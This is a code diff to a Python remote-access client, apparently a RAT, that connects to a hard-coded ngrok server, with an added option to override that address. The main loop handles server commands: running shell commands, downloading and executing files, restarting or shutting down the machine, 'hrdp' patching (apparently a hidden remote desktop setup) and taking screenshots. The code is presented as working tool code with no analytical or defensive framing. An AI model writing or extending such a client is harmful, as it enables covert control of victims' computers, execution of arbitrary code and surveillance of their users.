@@ -5,11 +5,19 @@ from ast import literal_eval
 from platform import platform
 from zlib import compress, decompress
 import requests
+import argparse
 
-SERVER_ADDRESS = "https://3965-121-200-4-145.ngrok-free.app"  # Replace with the ngrok URL obtained after running ngrok
+
+SERVER_ADDRESS = "https://c7f7-121-200-4-145.ngrok-free.app"  # Replace with the ngrok URL obtained after running ngrok
 #SERVER_ADDRESS = "http://localhost:8000" #test
 RECONNECT_TIMER = 5
 
+parser = argparse.ArgumentParser()
+parser.add_argument('-srvr-addr', type=str, help='server address')
+args = parser.parse_args()
+
+if args.srvr_addr:
+    SERVER_ADDRESS = args.srvr_addr
 class Client:
     def __init__(self):
         """
@@ -17,6 +25,7 @@ class Client:
         """
         self.server_address = SERVER_ADDRESS
         response = requests.get(self.server_address)
+        print(response.status_code)
         if response.status_code == 200:
             print(f"Connected successfully to the server at {self.server_address}")
         else:
@@ -62,22 +71,26 @@ def main():
 
             # Respond to server requests
             while True:
-                cmd = client.receive().split(maxsplit=1)
-                print(cmd)
-                if cmd[0] == 'shell':
-                    Shell.shell(client, cmd[1])
-                elif cmd[0] == 'restart':
-                    Power.restart()
-                elif cmd[0] == 'shutdown':
-                    Power.shutdown()
-                elif cmd[0] == 'execute':
-                    Execute.download_and_execute(client)
-                elif cmd[0] == 'hrdp':
-                    HRDP.patch(client, cmd[1], SERVER_ADDRESS)
-                elif cmd[0] == 'screenshot':
-                    Screenshot.take_screenshot(client)
+                cmd = client.receive()
+                if cmd:
+                    cmd = cmd.split(maxsplit=1)
+                    print(cmd)
+                    if cmd[0] == 'shell':
+                        Shell.shell(client, cmd[1])
+                    elif cmd[0] == 'restart':
+                        Power.restart()
+                    elif cmd[0] == 'shutdown':
+                        Power.shutdown()
+                    elif cmd[0] == 'execute':
+                        Execute.download_and_execute(client)
+                    elif cmd[0] == 'hrdp':
+                        HRDP.patch(client, cmd[1], SERVER_ADDRESS)
+                    elif cmd[0] == 'screenshot':
+                        Screenshot.take_screenshot(client)
+                    else:
+                        client.send('[!] Unconfigured option')
                 else:
-                    client.send('[!] Unconfigured option')
+                    sleep(1)
         else:
             print('Error obtaining client data... Trying to reconnect...')
             sleep(RECONNECT_TIMER * 10)
@@ -85,7 +98,6 @@ def main():
         print('Connection lost... Trying to reconnect...')
         sleep(RECONNECT_TIMER)
         main()
-
 
 if __name__ == "__main__":
     main()
